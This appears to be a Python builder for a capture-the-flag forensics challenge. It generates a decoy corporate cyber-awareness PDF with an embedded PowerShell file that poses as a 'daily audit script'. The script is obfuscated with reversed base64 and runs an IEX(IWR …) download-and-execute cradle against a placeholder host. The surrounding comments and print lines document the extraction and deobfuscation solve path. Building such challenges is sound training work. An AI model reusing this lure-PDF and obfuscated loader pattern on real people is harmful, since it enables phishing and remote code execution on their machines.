#!/usr/bin/env python3
"""
build_pdf_embedded_ps.py — CTF Tier 3 Challenge Builder

Creates a PDF that looks like a government cybersecurity awareness
fact sheet. Embedded inside is an obfuscated PowerShell payload
(.ps1 attachment). When deobfuscated, the PowerShell makes an
Invoke-WebRequest to a URL — and the URL contains the flag.

Intended solve path:
  1. pdfid.py target.pdf                 -> shows /EmbeddedFile > 0
  2. pdf-parser.py --search EmbeddedFile -> locate the attachment
  3. pdf-parser.py -o N -d out.ps1       -> extract the payload
  4. Inspect .ps1 — see obfuscated PowerShell
  5. Deobfuscate (reverse the string, base64 decode)
  6. Resulting IEX command's URL contains the flag

Usage:
  python3 build_pdf_embedded_ps.py --flag "CTF{example}"
  python3 build_pdf_embedded_ps.py --flag "CTF{x}" --output advisory.pdf
"""

import argparse
import base64
import os
import sys

from reportlab.lib.colors import HexColor, white
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.pdfgen import canvas
from reportlab.platypus import Paragraph


# ----------------------------------------------------------------------------
# Decoy content
# ----------------------------------------------------------------------------

DECOY_URLS = [
    "https://cisa.gov.local/advisories/2026-q2",
    "https://internal.threatfeed.local/iocs/may",
    "https://wiki.acme-corp.local/security/playbooks",
    "https://secure-portal.acme-corp.local/training",
    "https://siem-prod.acme-corp.local/dashboards",
    "https://kb.acme-corp.local/article/incident-response",
    "https://reports.opensecuritydaily.com/weekly",
    "https://status.acme-corp.local",
    "https://helpdesk.acme-corp.local/submit",
    "https://learning.acme-corp.local/cybersec-101",
]

# Color palette inspired by government fact sheets
TEAL = HexColor("#D6EBE9")
ORANGE = HexColor("#E8804A")
DARK_BLUE = HexColor("#0F3556")
ORANGE_BAR = HexColor("#E8804A")
LIGHT_ORANGE = HexColor("#F7E0CE")
GRAY_TEXT = HexColor("#333333")


# ----------------------------------------------------------------------------
# PowerShell obfuscation
# ----------------------------------------------------------------------------

def build_obfuscated_powershell(flag):
    """
    Build an obfuscated PowerShell payload whose deobfuscated form
    is:  IEX(IWR 'https://payload-host.local/get/<FLAG>').Content

    Obfuscation: base64 + string reversal + variable concatenation.
    """
    inner_url = "https://payload-host.local/get/" + flag
    real_command = "IEX(IWR '" + inner_url + "').Content"

    # Layer 1: base64 the real command (UTF-16LE — what PowerShell -EncodedCommand uses)
    b64 = base64.b64encode(real_command.encode("utf-16-le")).decode("ascii")

    # Layer 2: reverse the base64 string
    reversed_b64 = b64[::-1]

    # Layer 3: variable concatenation in PowerShell to obscure the literal
    half = len(reversed_b64) // 2
    part_a = reversed_b64[:half]
    part_b = reversed_b64[half:]

    powershell = f"""# Daily security audit script
# Automated by Acme Corp SecOps - Ref: SEC-AUDIT-2026
# Do not modify without authorization

$a = "{part_a}"
$b = "{part_b}"
$c = $a + $b

# Reverse and decode
$reversed = -join ($c[-1..-($c.Length)])
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($reversed))

# Execute audit retrieval
Invoke-Expression $decoded
"""
    return powershell


# ----------------------------------------------------------------------------
# PDF construction
# ----------------------------------------------------------------------------

def draw_header_block(c, width, height):
    """Big colored header at top of page 1."""
    # Teal background bar across top portion
    c.setFillColor(TEAL)
    c.rect(0, height - 2.4 * inch, width, 2.4 * inch, fill=1, stroke=0)

    # Orange accent shape on right
    c.setFillColor(ORANGE)
    c.circle(width - 1.0 * inch, height - 1.2 * inch, 0.6 * inch, fill=1, stroke=0)

    # Title text
    c.setFillColor(DARK_BLUE)
    c.setFont("Helvetica-Bold", 30)
    c.drawString(0.6 * inch, height - 1.0 * inch, "Build Your Cyber")
    c.drawString(0.6 * inch, height - 1.4 * inch, "Awareness Routine")

    # Subtitle
    c.setFillColor(GRAY_TEXT)
    c.setFont("Helvetica", 11)
    c.drawString(0.6 * inch, height - 1.75 * inch,
                 "You know that cyber hygiene is key to a safer organization —")
    c.drawString(0.6 * inch, height - 1.92 * inch,
                 "and small changes can make a big difference!")

    c.setFont("Helvetica-Bold", 11)
    c.drawString(0.6 * inch, height - 2.18 * inch,
                 "Follow these tips to build a security routine that works for your team.")


def draw_section_header(c, x, y, text):
    """Orange bar + bold section title — matches the fact sheet style."""
    c.setFillColor(ORANGE_BAR)
    c.rect(x, y + 0.05 * inch, 0.5 * inch, 0.05 * inch, fill=1, stroke=0)
    c.setFillColor(DARK_BLUE)
    c.setFont("Helvetica-Bold", 16)
    c.drawString(x, y - 0.18 * inch, text)


def draw_body_text(c, x, y, lines, font="Helvetica", size=10, leading=14):
    """Draw a block of text lines, returning the new y position."""
    c.setFillColor(GRAY_TEXT)
    c.setFont(font, size)
    for line in lines:
        c.drawString(x, y, line)
        y -= leading
    return y


def draw_info_box(c, x, y, width_in, height_in, title, body_lines):
    """A colored info box like the 'What about alcohol?' callout."""
    c.setFillColor(LIGHT_ORANGE)
    c.rect(x, y - height_in * inch, width_in * inch, height_in * inch,
           fill=1, stroke=0)

    c.setFillColor(DARK_BLUE)
    c.setFont("Helvetica-Bold", 12)
    c.drawString(x + 0.15 * inch, y - 0.3 * inch, title)

    c.setFillColor(GRAY_TEXT)
    c.setFont("Helvetica", 9)
    text_y = y - 0.55 * inch
    for line in body_lines:
        c.drawString(x + 0.15 * inch, text_y, line)
        text_y -= 12


def build_pdf(flag, ps_payload_path, output_path):
    """Construct the PDF and embed the PowerShell file attachment."""
    c = canvas.Canvas(output_path, pagesize=letter)
    width, height = letter

    # Metadata (decoys, no flag here)
    c.setTitle("Build Your Cyber Awareness Routine")
    c.setAuthor("Acme Corp Security Awareness Program")
    c.setSubject("Quarterly security awareness fact sheet - Internal Distribution")
    c.setKeywords("cyber,awareness,training,security," + DECOY_URLS[0])

    # ---------------- PAGE 1 ----------------
    draw_header_block(c, width, height)

    # Section: "Choose a mix of healthy habits"
    y = height - 3.0 * inch
    draw_section_header(c, 0.6 * inch, y, "Choose a mix of strong habits")

    y -= 0.45 * inch
    body = [
        "There are lots of strong choices for daily security hygiene. Build",
        "a routine that fits your role and your team's workflow:",
        "",
        "  - Use a password manager and unique passwords per account",
        "  - Enable multi-factor authentication everywhere it is offered",
        "  - Keep your operating system and applications fully patched",
        "  - Be cautious with email attachments — verify before opening",
        "  - Report suspicious messages via " + DECOY_URLS[8],
        "",
        "Different roles need different habits — that's okay. You can find",
        "a security routine that works for you and your team.",
    ]
    y = draw_body_text(c, 0.6 * inch, y, body)

    # Section: "Cut down on..."
    y -= 0.2 * inch
    draw_section_header(c, 0.6 * inch, y, "Cut down on risky habits")

    y -= 0.45 * inch
    body = [
        "Check your daily routine and reduce these 3 things:",
        "",
        "  - Reused passwords - one breach exposes every account",
        "  - Unverified downloads - install only from trusted sources",
        "  - Unencrypted data in transit - prefer https over http",
        "",
        "Refer to internal playbooks at:",
        "  " + DECOY_URLS[2],
        "  " + DECOY_URLS[5],
    ]
    y = draw_body_text(c, 0.6 * inch, y, body)

    # Info box: "What about phishing?"
    y -= 0.3 * inch
    draw_info_box(
        c, 0.6 * inch, y, 6.5, 1.2,
        "What about phishing?",
        [
            "If you receive a suspicious message, do not click any links. Report",
            "via the security portal at " + DECOY_URLS[3] + ".",
            "Remember: when in doubt, ask first. Phishing accounts for the majority",
            "of initial-access incidents - a 2-second check protects everyone.",
        ],
    )

    # Page footer
    c.setFillColor(ORANGE)
    c.rect(0, 0, 0.5 * inch, 0.05 * inch, fill=1, stroke=0)
    c.setFillColor(GRAY_TEXT)
    c.setFont("Helvetica", 9)
    c.drawString(width - 0.6 * inch, 0.3 * inch, "1")

    c.showPage()

    # ---------------- PAGE 2 ----------------
    # Section: "Find out what you need"
    y = height - 0.8 * inch
    draw_section_header(c, 0.6 * inch, y, "Find out what training you need")

    y -= 0.45 * inch
    body = [
        "Your required training depends on your role, the data you handle,",
        "and your access level. Talk with your manager and review the",
        "training portal:",
        "  " + DECOY_URLS[9],
        "",
        "Recommended baseline (everyone):",
        "  - Annual security awareness refresher",
        "  - Phishing recognition module",
        "  - Acceptable use policy acknowledgment",
        "",
        "Recommended for technical roles:",
        "  - Secure coding fundamentals",
        "  - Incident response basics",
        "  - Threat intelligence overview from " + DECOY_URLS[6],
    ]
    y = draw_body_text(c, 0.6 * inch, y, body)

    # Section: "Check the indicators"
    y -= 0.3 * inch
    draw_section_header(c, 0.6 * inch, y, "Check the indicators")

    y -= 0.45 * inch
    body = [
        "Watch for indicators of compromise (IOCs) on your systems:",
        "",
        "  - Unexpected outbound connections to unfamiliar hosts",
        "  - Sudden CPU spikes from background processes",
        "  - Failed login attempts from foreign geographies",
        "  - Files modified outside of normal working hours",
        "",
        "Operational dashboards: " + DECOY_URLS[4],
        "Current status page: " + DECOY_URLS[7],
        "",
        "An attached daily-audit script is included with this fact sheet for",
        "reference. SecOps reviews these scripts as part of routine audits.",
    ]
    y = draw_body_text(c, 0.6 * inch, y, body)

    # Info box: "What about supplements... I mean updates?"
    y -= 0.3 * inch
    draw_info_box(
        c, 0.6 * inch, y, 6.5, 1.0,
        "What about software updates?",
        [
            "Most systems can stay safe with timely updates, but you might need",
            "extra tools for specific roles. For example, technical staff may",
            "need endpoint detection tools beyond the default antivirus.",
            "Talk with IT before installing any third-party software.",
        ],
    )

    # Footer
    c.setFillColor(ORANGE)
    c.rect(0, 0, 0.5 * inch, 0.05 * inch, fill=1, stroke=0)
    c.setFillColor(GRAY_TEXT)
    c.setFont("Helvetica", 9)
    c.drawString(width - 0.6 * inch, 0.3 * inch, "2")

    # Embed the PowerShell file as a PDF attachment
    with open(ps_payload_path, "rb") as f:
        ps_bytes = f.read()
    c.setAuthor("Acme Corp Security Awareness Program")
    # Reportlab supports file attachments via canvas.embedFile()
    c.embed_file = None  # placeholder marker — actual embed below

    # ReportLab's API: canvas.attachFile? Actually we use the proper method:
    # canvas.Canvas has no public attachFile; use lower-level approach.
    # ReportLab 3.6 exposes this via the canvas's _doc:
    from reportlab.pdfbase.pdfdoc import PDFDictionary, PDFStream, PDFString, PDFArray, PDFName

    pdf_file_spec = c._doc.Reference(
        PDFDictionary({
            "Type": PDFName("Filespec"),
            "F": PDFString("daily_audit.ps1"),
            "UF": PDFString("daily_audit.ps1"),
            "EF": PDFDictionary({
                "F": c._doc.Reference(
                    PDFStream(
                        dictionary=PDFDictionary({
                            "Type": PDFName("EmbeddedFile"),
                            "Subtype": PDFName("application/octet-stream"),
                        }),
                        content=ps_bytes,
                        filters=[],
                    )
                ),
            }),
            "Desc": PDFString("Daily audit script - reference"),
        })
    )

    # Attach to document via Names tree
    names_dict = PDFDictionary({
        "EmbeddedFiles": PDFDictionary({
            "Names": PDFArray([PDFString("daily_audit.ps1"), pdf_file_spec]),
        }),
    })
    c._doc.Catalog.Names = c._doc.Reference(names_dict)

    c.save()


# ----------------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Build a CTF Tier 3 challenge: PDF with embedded obfuscated PowerShell."
    )
    parser.add_argument("--flag", required=True, help='Flag, e.g. "CTF{example}"')
    parser.add_argument("--output", default="cyber_awareness.pdf", help="Output PDF path")
    parser.add_argument("--keep-payload", action="store_true",
                        help="Keep the intermediate .ps1 file for debugging")
    args = parser.parse_args()

    # Build the obfuscated PowerShell payload
    ps_content = build_obfuscated_powershell(args.flag)
    ps_path = "_daily_audit.ps1"
    with open(ps_path, "w") as f:
        f.write(ps_content)
    print("Generated obfuscated PowerShell payload: " + ps_path)

    # Build the PDF with the payload embedded
    build_pdf(args.flag, ps_path, args.output)
    print("Built PDF: " + args.output)

    # Cleanup
    if not args.keep_payload and os.path.exists(ps_path):
        os.remove(ps_path)

    print("")
    print("Verify the challenge:")
    print("  open " + args.output)
    print("  python3 ~/tools/pdfid.py " + args.output)
    print("    -> /EmbeddedFile should be > 0")
    print("  python3 ~/tools/pdf-parser.py --search EmbeddedFile " + args.output)
    print("  python3 ~/tools/pdf-parser.py -o N -d extracted.ps1 " + args.output)
    print("    (where N is the EmbeddedFile object number)")
    print("  cat extracted.ps1   # see obfuscated PowerShell")
    print("")
    print("Solve path: reverse the concatenated string, base64-decode it,")
    print("the resulting IEX(IWR ...) URL contains the flag.")


if __name__ == "__main__":
    main()
